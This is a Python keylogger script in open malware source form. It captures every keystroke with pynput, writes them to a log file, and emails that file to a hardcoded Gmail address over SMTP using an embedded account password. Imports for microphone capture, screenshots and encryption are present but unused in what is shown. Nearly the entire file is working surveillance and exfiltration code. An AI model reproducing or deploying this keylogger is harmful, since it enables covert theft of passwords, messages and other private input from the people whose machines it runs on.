from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#Default Modules for Collection
import socket
import platform

#Clipboard Module
#import win32clipboard
#https://stackoverflow.com/questions/1825692/can-python-send-text-to-the-mac-clipboard

#Keystrokes 
from pynput.keyboard import Key, Listener

#Time
import time
import os

#Microphone
from scipy.io.wavfile import write
import sounddevice as sd

#Cryptography for encryption
from cryptography.fernet import Fernet

#Gitpass for username and requests for information
import getpass
from requests import get

#Screenshot image grab
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
email_address =  "keylogger4214389@gmail.com"
password = "gr@ntColl1nsKEY##"

toaddress = "keylogger4214389@gmail.com"


file_path = "/Users/rickyanashita/Developer/Python-Keylogger"
extend = "/"

def send_email(filename, attachment, toaddress):

    fromaddress = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddress
    msg['To'] = toaddress
    msg['Subject'] = "New Log File"

    body = "Body of the mail"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')
    
    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment: filename=%s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddress, password)

    text = msg.as_string()
    s.sendmail(fromaddress, toaddress, text)
    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddress)

count = 0
keys = []

def on_press(key):
    global keys, count
    print(key) 
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


